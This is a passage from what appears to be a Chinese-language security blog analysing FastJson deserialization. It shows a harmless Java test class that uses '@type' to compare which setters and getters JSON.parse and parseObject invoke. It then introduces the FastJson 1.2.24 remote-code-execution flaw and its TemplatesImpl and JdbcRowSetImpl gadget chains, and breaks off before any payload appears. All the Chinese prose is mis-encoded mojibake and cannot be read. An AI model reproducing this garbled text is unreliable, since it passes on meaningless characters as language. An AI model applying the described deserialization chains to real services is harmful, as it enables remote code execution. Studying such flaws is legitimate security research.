<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.alibaba.fastjson.JSON;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.UnsupportedEncodingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Arrays;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Properties;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName FastJsonTest
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/11 19:34
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> FastJsonTest {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String t1;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Integer t2;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Boolean t3;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t4;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t5;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">byte</span>[] t6;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String toString() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;FastJsonTest{&#34;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;t1=&#39;&#34;</span> + t1 + <span style="color:#0ff;font-weight:bold">&#39;\&#39;&#39;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t2=&#34;</span> + t2 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t3=&#34;</span> + t3 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t4=&#34;</span> + t4 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t5=&#34;</span> + t5 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t6=&#34;</span> + Arrays.<span style="color:#007f7f">toString</span>(t6) +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#39;}&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">byte</span>[] getT6() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT6(<span style="color:#fff;font-weight:bold">byte</span>[] t6) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t6</span> = t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> FastJsonTest() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;FastJsonTest() is called &#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT5(Properties t5) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t5</span> = t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT1(String t1) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t1</span> = t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT2(Integer t2) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t2</span> = t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getT1() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Integer getT2() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Boolean getT3() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT3()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT4() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT4()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t4;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT5() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> UnsupportedEncodingException {
</span></span><span style="display:flex;"><span>        String jsonString = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.reus09.FastJsonTest\&#34;,\&#34;t1\&#34;:\&#34;t1\&#34;,\&#34;t2\&#34;:1,\&#34;t3\&#34;:1,\&#34;t4\&#34;:{},\&#34;t5\&#34;:{},\&#34;t6\&#34;:\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,FastJson&#34;</span>.<span style="color:#007f7f">getBytes</span>(<span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>))+<span style="color:#0ff;font-weight:bold">&#34;\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parse(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj = JSON.<span style="color:#007f7f">parse</span>(jsonString);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string,clazz)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj1 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString,FastJsonTest.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj1);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj2 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144421136.png" alt="image-20221012144421136"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144724722.png" alt="image-20221012144724722"  />
</p>
<p>æ€»çš„æ¥è¯´ï¼Œ<code>parse(string)</code>,<code>parseObject(string,clazzs)</code>ä¸<code>parseObject(string)</code>è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œ<code>parse(string) </code>ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ <code>setter</code> æ–¹æ³•ï¼Œè€Œ <code>parseObject(string)</code> ç”±äºè¦å°†è¿”å›å€¼è½¬åŒ–ä¸º<code>JSONObject</code>ï¼Œå¤šæ‰§è¡Œäº†<code> JSON.toJSON(obj)</code>ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„<code>getter </code>æ–¹æ³•æ¥å°†å‚æ•°èµ‹å€¼ç»™<code>JSONObject</code>ï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<code>parseObject(string)</code>çš„å±å®³æ€§ç›¸å¯¹ä¼šæ›´å¤§ã€‚</p>
<h2 id="fastjson-1224åˆ†æ"><code>FastJson 1.2.24</code>åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#fastjson-1224åˆ†æ">#</a></h2>
<p><code>FastJson1.2.24</code>å¼€å¯äº†FastJsonååºåˆ—å®ç°RCEçš„å¤§é—¨</p>
<p>fastjson é»˜è®¤ä½¿ç”¨ <code>@type</code> æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚</p>
<p>è¿™é‡Œå¯¹<code>1.2.24</code>çš„ä¸¤æ¡å¸¸è§åˆ©ç”¨é“¾<code>TemplatesImpl ååºåˆ—åŒ–</code>å’Œ<code>JdbcRowSetImpl ååºåˆ—åŒ–</code>è¿›è¡Œç®€å•çš„å­¦ä¹ ã€‚</p>
<h3 id="templatesimpl-ååºåˆ—åŒ–"><code>TemplatesImpl</code> ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#templatesimpl-ååºåˆ—åŒ–">#</a></h3>
<p>åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾çš„å…¨è¿‡ç¨‹ï¼Œå®é™…ä¸Šåœ¨æŸ¥é˜…èµ„æ–™çš„åŒæ—¶ï¼Œå‘ç°å…¶ä¹Ÿæ˜¯<code>CommonsCollections-3</code>é“¾å­çš„åˆ†æï¼Œå› ä¸ºåˆšåˆšæ¥è§¦åˆ°<code>Javaå®‰å…¨</code>,å¯¹<code>CC3é“¾åªæ˜¯</code>ç•¥æœ‰è€³é—»ï¼Œä¹‹åçš„å­¦ä¹ ä¹‹ä¸­ä¼šæ…¢æ…¢å­¦ä¹ <code>CC</code>é“¾çš„å„ç§åˆ©ç”¨å§¿åŠ¿ã€‚</p>
<p>å‚è€ƒçš„å„ä½å¤§å¸ˆå‚…çš„åšå®¢å…³äº<code>TemplateImpl</code>ååºåˆ—åŒ–é“¾çš„æ€è€ƒéƒ½æ˜¯ä»æ¼æ´æŒ–æ˜çš„æ€è·¯å¼€å§‹ï¼Œä»<code>getTransletInstance()</code>è¿™ä¸ªå®ä¾‹åŒ–ç‚¹å‡ºå‘ï¼Œéœ€è¦å“ªä¸€ä¸ªåˆ©ç”¨å…ƒç´ å°±å»å¯»æ‰¾ï¼Œæœ€åå®Œå–„åˆ©ç”¨è¿‡ç¨‹ã€‚</p>
<p>å‡½æ•°æ ˆè°ƒç”¨æƒ…å†µ:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
